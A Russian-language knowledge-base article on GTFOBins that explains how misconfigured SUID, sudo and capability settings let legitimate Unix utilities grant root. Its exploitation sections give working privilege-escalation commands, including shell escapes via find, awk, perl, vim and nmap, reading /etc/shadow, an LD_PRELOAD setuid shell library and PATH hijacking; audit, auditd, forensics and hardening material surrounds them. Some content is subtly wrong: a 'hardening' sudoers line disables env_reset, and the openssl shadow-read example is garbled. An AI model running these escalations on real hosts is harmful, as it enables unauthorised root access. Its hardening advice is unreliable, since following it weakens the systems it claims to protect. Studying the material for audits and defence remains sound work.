# GTFOBins

## Определения

**GTFOBins** ([gtfobins.org](https://gtfobins.org/), GitHub-репозиторий — [GTFOBins/GTFOBins.github.io](https://github.com/GTFOBins/GTFOBins.github.io)) — курируемый список Unix-бинарников, которые могут быть использованы для обхода локальных ограничений безопасности в неправильно настроенных системах.

Это **не инструмент**, а база знаний (сайт + GitHub-репозиторий), документирующая техники эксплуатации легитимных системных утилит.

> **Важно:** GTFOBins не содержит эксплойтов нулевого дня. Все техники используют «легитимное» поведение бинарников, которое становится опасным только при определенной конфигурации системы (SUID-бит, расширенные sudo-права, capabilities).

**Аналог для Windows:** [**LOLBAS**](https://lolbas-project.github.io/) (Living Off The Land Binaries, Scripts and Libraries) — аналогичный проект для ОС Windows, описывающий использование встроенных компонентов для обхода защиты.

**Формат данных:** GTFOBins распространяет данные через GitHub-репозиторий ([GTFOBins/GTFOBins.github.io](https://github.com/GTFOBins/GTFOBins.github.io), лицензия GPL-3.0). Каждый бинарник описан отдельным Markdown-файлом в каталоге `_gtfobins/` (например, [_gtfobins/find](https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/find)). Для автоматизированного аудита доступен [JSON API](https://gtfobins.org/api.json), включающий все записи с метаданными о техниках, контекстах (SUID, sudo, Capabilities, Restricted Shell) и функциях (privilege escalation, file read, file write, shell, reverse shell, bind shell). Интеграция с [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/#layerURL=https://gtfobins.org/mitre.json) через файл `mitre.json`.

## Основные концепции

### Принцип работы

Каждая запись в GTFOBins описывает один бинарный файл и набор техник его нестандартного использования для:

- **Повышения привилегий** — получение root-доступа через SUID-бит, sudo-права, capabilities.
- **Пост-эксплуатация** — reverse shell, чтение/запись файлов, обход ограничений оболочки.
- **Обхода ограничений** — выполнение команд в restricted shell (rbash, rssh), передача файлов.

### Почему легитимные утилиты опасны

В модели DAC (Discretionary Access Control) Linux утилиты наследуют привилегии родительского процесса. Когда бинарник запускается с SUID-битом, ядро устанавливает Effective UID (EUID) процесса в значение владельца файла (часто `0` — root). Если утилита позволяет выполнять произвольный код (встроенный интерпретатор, системные вызовы `execve()`, `system()`), злоумышленник может получить код, выполняемый с повышенными привилегиями.

Ключевые условия для эксплуатации:
1. **SUID-бит или sudo-права** на утилите, которая может выполнять внешние команды.
2. **Отсутствие NOEXEC** в sudoers (запрещает порождение дочерних процессов).
3. **Capabilities** с флагом `cap_setuid` или `cap_dac_override`.

### Категории техник

GTFOBins классифицирует техники по контексту эксплуатации:

| Категория | Описание | Пример |
|---|---|---|
| **SUID** | Бинарник с SUID-битом выполняется от имени владельца (часто root) | `find . -exec /bin/sh \; -quit` |
| **sudo** | Запуск через `sudo` с расширенными возможностями | `sudo find . -exec /bin/sh \; -quit` |
| **Capabilities** | Linux capabilities (`cap_setuid`, `cap_dac_override`, `cap_dac_read_search`) | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| **PATH hijacking** | SUID/sudo-бинарник вызывает внешнюю команду без полного пути | `echo '/bin/sh' > /tmp/find; export PATH=/tmp:$PATH` |
| **LD_PRELOAD** | Подмена разделяемой библиотеки через переменную окружения | `sudo LD_PRELOAD=./shell.so vim` (если `env_keep += LD_PRELOAD` в sudoers) |
| **Restricted Shell** | Обход ограничений rbash, rssh | `vi` → `:!sh` |
| **File Read/Write** | Чтение/запись произвольных файлов через утилиту | `tar -cf /dev/null /etc/shadow --checkpoint=1` |
| **Shell Escape** | Получение полноценной оболочки из ограниченной | `awk 'BEGIN {system("/bin/sh")}'` |

### Взаимосвязь с механизмами безопасности

1.  **SUID-бит:** Ключевой вектор. Бинарник с SUID выполняется с правами владельца файла. Если утилита позволяет выполнять произвольный код, это ведет к немедленному захвату прав владельца (обычно `root`).
    > **Подробно:** [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md).
2.  **Capabilities:** Гранулярные привилегии. Даже если у бинарника нет SUID-бита, наличие `cap_setuid` позволяет ему сменить UID на 0.
    > **Подробно:** [Linux Capabilities](../../Linux/Security/Mechanisms/Capabilities.md).
3.  **Sudoers:** Неправильная настройка `/etc/sudoers` (например, разрешение запуска `vi` или `find` без пароля) позволяет пользователю «покинуть» утилиту и получить shell от имени `root`.
4.  **no_new_privs:** Флаг `no_new_privs` (доступен с ядра 3.5+) блокирует получение новых привилегий через `execve()`. Даже если процесс запускается от root, установленный `no_new_privs` не позволит SUID-бинарнику повысить привилегии. Это ключевой механизм защиты в systemd-юнитах и для обычных пользователей.

## Установка и настройка

### Локальная копия и обновление

Для офллайн-аудита базу GTFOBins можно получить локально:

```bash
# Клон репозитория (требует git)
git clone --depth 1 https://github.com/GTFOBins/GTFOBins.github.io.git /opt/gtfobins
cd /opt/gtfobins && git pull  # обновление

# JSON API для автоматизированного аудита
curl -sS https://gtfobins.org/api.json -o /usr/local/share/gtfobins.json
```

**Структура данных (JSON API):**
```json
{
  "functions": ["shell", "sudo", "suid", "capabilities", ...],
  "contexts": {...},
  "executables": {
    "bash": {
      "functions": {"sudo": [{"code": "sudo bash -p"}]},
      "contexts": {"sudo": true, "suid": true},
      "alias": ["bash", "sh"]
    }
  }
}
```

### Лицензия и интеграция

Проект распространяется под лицензией **GPL-3.0**. Данные могут использоваться в:
- **Автоматических сканерах** (LinPEAS, Linux Smart Enumeration) — встроена проверка SUID/sudo/capabilities.
- **MITRE ATT&CK Navigator** — файл [`mitre.json`](https://gtfobins.org/mitre.json) импортирует тактики и техники GTFOBins в матрицу ATT&CK.
- **Burp Suite, Nessus, Nexpose** — используют GTFOBins API для проверки правил sudoers.

## Практические сценарии

### Поиск векторов эскалации

```bash
# 1. Поиск файлов с SUID/SGID битами
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null

# 2. Поиск файлов с установленными Capabilities
getcap -r / 2>/dev/null

# 3. Проверка разрешенных команд через sudo
sudo -l
```

### Пакетный аудит SUID-бинарников по базе GTFOBins

```bash
#!/bin/bash
# audit_gtfobins.sh — сравнение SUID-бинарников с базой GTFOBins
GTFO_TXT="/usr/share/gtfobins.txt"
LOG="/var/log/gtfobins_audit.log"

if [[ ! -f "$GTFO_TXT" ]]; then
    echo "База GTFOBins не найдена: $GTFO_TXT"
    echo "Скачайте: curl -L -o $GTFO_TXT https://github.com/GTFOBins/GTFOBins.github.io/raw/master/_gtfobins/gtfobins.txt"
    exit 1
fi

echo "=== Аудит SUID-бинарников: $(date '+%Y-%m-%d %H:%M:%S') ===" >> "$LOG"

# Найти все SUID-файлы и проверить их в базе
find / -xdev -type f -perm -4000 2>/dev/null | while read -r bin; do
    name=$(basename "$bin")
    if grep -q "^$name$" "$GTFO_TXT" 2>/dev/null; then
        echo "ОПАСНО: $bin — присутствует в GTFOBins" | tee -a "$LOG"
    fi
done

echo "---" >> "$LOG"
```

**Интеграция с cron (SRE):**
```cron
# /etc/cron.d/gtfobins_audit
# Еженедельный аудит в воскресенье в 03:00
0 3 * * 0 root /usr/local/bin/audit_gtfobins.sh
```

### Мониторинг через auditd (реальное время)

Для отслеживания попыток эксплуатации GTFOBins-техник:

```bash
# Мониторинг запуска shell из неожиданных бинарников
sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/find -k gtfobins_find
sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/vim -k gtfobins_vim

# Проверка логов:
sudo ausearch -k gtfobins_* --start recent | aureport -x --input-logs
```

### Форензика после подозрительной активности

```bash
# 1. Проверить историю bash/zsh на подозрительные команды
sudo grep -E 'find.*-exec|awk.*system|python.*os\.system|perl.*exec' /home/*/.bash_history /root/.bash_history

# 2. Найти процессы, запущенные из подозрительных бинарников
ps aux | grep -E 'find|awk|sed|vim|nano|less|more'

# 3. Проверить, не появились ли новые пользователи или изменения в /etc/passwd, /etc/shadow
sudo grep -n '^root:' /etc/passwd
sudo ls -l /etc/passwd /etc/shadow

# 4. Проверить auditd логи за последний час
sudo ausearch -k gtfobins_* --start recent

# 5. Найти новые SUID-файлы, появившиеся за последние 24 часа
sudo find / -xdev -type f -perm -4000 -mtime -1 2>/dev/null
```

### Примеры эксплуатации популярных утилит

#### Bash (SUID)
Если бинарник `bash` имеет SUID-бит (ошибка конфигурации), он может сбросить привилегии. Опция `-p` (privileged mode) предотвращает это:
```bash
/usr/bin/bash -p
```

#### Perl / Ruby / Python (sudo)
Скриптовые языки позволяют выполнить произвольный код одной строкой:
```bash
# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# Python
sudo python3 -c 'import os; os.system("/bin/sh")'
```

#### Find (SUID/sudo)
Использование встроенного ключа выполнения команд:
```bash
sudo find . -exec /bin/sh \; -quit
```

#### Vi / Vim (Shell Escape)
Выход в оболочку из текстового редактора:
```text
:!sh
# или
:set shell=/bin/sh
:shell
```

#### Zip / Tar (File Read/Shell)
Эксплуатация через опции выполнения команд или архивацию чувствительных файлов:
```bash
# Zip
sudo zip /tmp/test.zip /etc/shadow -T --unzip-command="sh -c /bin/sh"
```

#### AWK / Sed / NMAP (Shell Escape)
Утилиты с возможностью выполнения системных команд:
```bash
# AWK
sudo awk 'BEGIN {system("/bin/sh")}'

# Sed
sudo sed -n '1e/bin/sh' /etc/passwd

# NMAP (интерактивный режим)
sudo nmap --interactive
nmap> !sh
```

#### OpenSSL (cap_dac_read_search)

Бинарник с `cap_dac_read_search+ep` может читать любые файлы, включая `/etc/shadow`, минуя DAC-проверки:

```bash
# Проверка наличия capabilities
getcap /usr/bin/openssl
# → /usr/bin/openssl = cap_dac_read_search+ep

# Чтение /etc/shadow
/usr/bin/openssl enc -in /etc/shadow -base64 -d
```

#### LD_PRELOAD (sudo)

Если в `/etc/sudoers` присутствует `env_keep += LD_PRELOAD`, можно подменить разделяемую библиотеку:

```bash
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
EOF
gcc -shared -o /tmp/shell.so -fPIC /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/vim  # любой sudo-разрешённый бинарник
```

#### PATH hijacking (SUID)

SUID-бинарник, вызывающий внешнюю команду без полного пути, можно обойти через изменение `PATH`:

```bash
# 1. Создаём поддельный бинарник с именем вызываемой команды
echo '/bin/sh -p' > /tmp/service
chmod +x /tmp/service

# 2. Перехватываем вызов через PATH
export PATH=/tmp:$PATH

# 3. Запускаем SUID-бинарник, который вызывает 'service'
./the-suid-binary
```

### Автоматизация с помощью `traitor`

Инструмент [traitor](./traitor.md) автоматизирует проверку бинарников на соответствие техникам GTFOBins:
```bash
# Сканирование и попытка автоматической эксплуатации
traitor -a
```

Меры защиты (Hardening)

1.  **Принцип минимизации SUID:** Удаляйте SUID-бит с утилит, где он не обязателен.
    ```bash
    chmod u-s /usr/bin/binary
    ```
2.  **Безопасный Sudo:** При настройке `/etc/sudoers` используйте `NOEXEC`, чтобы запретить запускаемым программам порождать дочерние процессы (оболочки). Подробнее в секции [Установка и настройка](#установка-и-настройка) и шаблонах ниже.
    ```text
    user ALL=(ALL) NOEXEC: /usr/bin/find
    ```
3.  **No New Privileges:** Используйте флаг `no_new_privs` для systemd-юнитов и пользовательских процессов, чтобы предотвратить получение новых прав через SUID/Capabilities.
4.  **Аудит (Auditd):** Настройте мониторинг выполнения команд с высокими привилегиями и аномального поведения (например, запуск `sh` из `vi`).
5.  **Системы принудительного контроля (MAC):** AppArmor и SELinux могут блокировать выполнение оболочек из приложений, которым это не свойственно по профилю.
6.  **Регулярный аудит SUID:** Сравнивайте найденные SUID/Capabilities-бинарники с локальной копией GTFOBins для выявления новых уязвимостей.

### Дополнительные практические паттерны hardening

**Шаблон systemd-юнита с запретом новых привилегий:**
```ini
[Service]
NoNewPrivileges=yes
RestrictSUIDSGID=yes
ProtectSystem=strict
ProtectHome=yes
```

**Паттерн sudoers для предотвращения shell-escape:**
```text
# secure_path гарантирует, что sudo вызывает только системные бинарники,
# а не поддельные из пользовательского PATH
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# NOEXEC запрещает дочерним процессам запускать внешние команды
# (требует компиляцию sudo с поддержкой noexec)
user ALL=(ALL) NOEXEC: /usr/bin/vim, /usr/bin/find, /usr/bin/awk

# Запрещаем наследование опасных переменных окружения
Defaults    !env_reset  # ИЛИ: явно перечисляйте безопасные переменные
```

**Монтирование с nosuid/noexec для пользовательских ФС:**
```bash
# /etc/fstab
UUID=... /home ext4 defaults,nosuid,nodev 0 2
UUID=... /tmp  ext4 defaults,nosuid,nodev,noexec 0 2
```

## Устранение неполадок

### Ложные срабатывания (false positives)

Не все найденные SUID-бинарники или sudo-правила являются уязвимостью. Типичные ложные срабатывания:

| Ситуация | Почему ложное срабатывание | Как проверить |
|---|---|---|
| `find` в `sudo -l` | `find -exec` может спавнить shell | Проверить наличие `NOEXEC` в sudoers; попробовать `sudo find . -exec /bin/sh \; -quit` |
| `perl` / `python` с sudo | Язык может вызывать `exec()` | Проверить, не используется ли `-e` с `system()`; ограничить конкретными флагами |
| `vim` с sudo | `:!sh` — shell escape | Добавить `NOEXEC:` для vim в sudoers |
| Бинарник с `cap_dac_read_search` | Может читать `/etc/shadow`, но не писать | Проверить наличие `cap_setuid` (а нет — только чтение) |

```bash
# Проверка: можно ли через конкретную утилиту спавнить shell
# Если оболочка появляется — уязвимость подтверждена
sudo /usr/bin/find . -exec /bin/sh \; -quit  # → если попали в shell, SUID уязвим
```

### Валидация (пост-аудит)

После применения мер защиты необходимо подтвердить, что эксплуатация больше невозможна:

```bash
# 1. Повторная проверка SUID-бинарников
find / -xdev -type f -perm -4000 -ls 2>/dev/null | \
    awk '{print $NF}' | xargs -I{} basename {} | \
    sort -u > /tmp/suid_before.txt

# 2. Проверка: ни один SUID-бинарник не должен быть в GTFOBins
#    (исключение: стандартные утилиты вроде /bin/mount, /usr/bin/sudo)
comm -12 <(sort /tmp/suid_before.txt) <(curl -sS https://gtfobins.org/api.json | \
    python3 -c "import json,sys; d=json.load(sys.stdin); print('\\n'.join(d['executables']))" | sort) > /tmp/suid_gtfobins.txt
cat /tmp/suid_gtfobins.txt  # должен быть пустым или содержать только специально разрешённые

# 3. Проверка auditd-правил
sudo auditctl -l | grep gtfobins_

# 4. Проверка: shell-escape больше не работает
sudo /usr/bin/vim --not-a-term -c ':!sh' -c ':q' -c ':q' 2>&1 | grep -q 'cannot' && \
    echo "Shell escape заблокирован" || echo "WARNING: shell escape всё ещё работает"
```

### Cleanup (откат изменений)

После тестового аудита или CTF-упражнения необходимо удалить использованные для эксплуатации артефакты:

```bash
# 1. Удалить поддельные бинарники и библиотеки
rm -f /tmp/shell.so /tmp/shell.c /tmp/service /tmp/find /tmp/date

# 2. Сбросить PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 3. Удалить временные файлы
rm -f /tmp/suid_before.txt /tmp/suid_gtfobins.txt
rm -rf /tmp/passwd.bak  # если делались копии /etc/passwd

# 4. Проверить целостность системы
# debsums (Debian/Ubuntu) — сверка контрольных сумм пакетов
debsums -c 2>/dev/null | head -20
```

## Дополнительная информация

### Применение

- **CTF-соревнования** — базовый ресурс для эскалации привилегий.
- **Пентест / Red Team** — справочник техник для аудита конфигурации и пост-эксплуатации.
- **DevOps / SRE** — чек-лист для аудита безопасности образов и хостов.

### Интеграция с инструментами сканирования

GTFOBins является «движком» техник для:
- [**traitor**](./traitor.md) — локальная эскалация привилегий.
- **LinPEAS / LinuxSmartEnumeration** — скрипты всестороннего аудита системы.

### См. также
- [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md) — глубокий разбор механизмов.
- [Linux Capabilities](../../Linux/Security/Mechanisms/Capabilities.md) — гранулярное управление правами.
- [Управление привилегиями: su, sudo и Polkit](../../Linux/SystemAdministration/privilege_management.md) — настройка sudoers и обзор векторов эскалации.
- [traitor](./traitor.md) — автоматизация эксплуатации.
